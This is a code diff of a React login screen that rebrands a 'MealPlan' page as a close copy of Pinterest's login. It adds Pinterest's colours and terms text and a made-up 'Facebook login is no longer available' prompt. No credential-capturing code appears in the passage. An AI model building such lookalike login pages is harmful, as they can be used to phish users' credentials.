+          <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 18px", overflow: "hidden" }}>
+           <img src="favicon.png" alt="Logo" style={{ width: "100%", height: "100%", objectFit: "cover" }}/>
           </div>
 
           <h2 style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 20 }}>Log in to see more</h2>
@@ -608,8 +616,7 @@ export default function App() {
               </button>
             </div>
             {error && <p style={{ color: "#e60023", fontSize: 13, textAlign: "left", marginBottom: 8 }}>{error}</p>}
-            <button type="submit" disabled={loading}
-              style={{ width: "100%", padding: 13, background: loading ? "#f87171" : "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", marginTop: 4, transition: "background 0.2s" }}>
+            <button type="submit" disabled={loading} style={{ width: "100%", padding: 13, background: loading ? "#f87171" : "#e60023", color: "#fff", border: "none", borderRadius: 50, fontSize: 15, fontWeight: 700, cursor: loading ? "not-allowed" : "pointer", marginTop: 4, transition: "background 0.2s" }}>
               {loading ? "Masuk..." : "Log in"}
             </button>
           </form>
@@ -646,24 +653,44 @@ export default function App() {
             Use QR code
           </SocialBtn>
 
-          <div style={{ marginTop: 14, fontSize: 13, color: "#555", borderTop: "1px solid #efefef", paddingTop: 14 }}>
-            Not on MealPlan yet?{" "}
-            <button onClick={() => setShowSignUp(true)}
-              style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, textDecoration: "underline", padding: 0 }}>
-              Sign up
-            </button>
+          <div style={{ marginTop: 20, display: "flex", flexDirection: "column", gap: 10, fontSize: 13, color: "#111" }}>
+            <div>
+              <p style={{ margin: 0, color: "#333", fontSize: 13 }}>Facebook login is no longer available</p>
+              <button type="button" onClick={() => alert("Update login method")} style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, padding: 0 }}>
+                Update login method
+              </button>
+            </div>
+
+            <div style={{ marginTop: 6 }}>
+              <span style={{ fontWeight: 700 }}>
+                Not on Pinterest yet?{" "}
+                <button onClick={() => setShowSignUp(true)} style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, padding: 0 }}>
+                  Sign up
+                </button>
+              </span>
+            </div>
+
+            <div style={{ marginTop: 4 }}>
+              <span style={{ color: "#333" }}>Are you a business? </span>
+              <button onClick={() => alert("Business setup")} style={{ background: "none", border: "none", color: "#111", fontWeight: 700, cursor: "pointer", fontSize: 13, padding: 0 }}>
+                Get started here!
+              </button>
+            </div>
           </div>
 
-          <p style={{ marginTop: 12, fontSize: 11, color: "#767676", lineHeight: 1.6 }}>
-            By continuing, you agree to MealPlan's <a href="#" style={{ color: "#767676" }}>Terms of Service</a> and <a href="#" style={{ color: "#767676" }}>Privacy Policy</a>. <a href="#" style={{ color: "#767676" }}>Notice at collection</a>.
+          <p style={{ marginTop: 24, fontSize: 11, color: "#767676", lineHeight: 1.5, padding: "0 10px" }}>
+            By continuing, you agree to Pinterest's{" "}
+            <a href="#" style={{ color: "#767676", textDecoration: "underline" }}>Terms of Service</a>{" "}
+            and acknowledge you've read our{" "}
+            <a href="#" style={{ color: "#767676", textDecoration: "underline" }}>Privacy Policy</a>.{" "}
+            <a href="#" style={{ color: "#767676", textDecoration: "underline" }}>Notice at collection</a>.
           </p>
         </div>
       </div>
 
-      {/* Sign up overlay */}
       {showSignUp && (
         <>
-          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)", zIndex: 29 }} onClick={() => setShowSignUp(false)} />
+          <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.55)", zIndex: 120 }} onClick={() => setShowSignUp(false)} />
           <SignUpModal onClose={() => setShowSignUp(false)} />
         </>
       )}
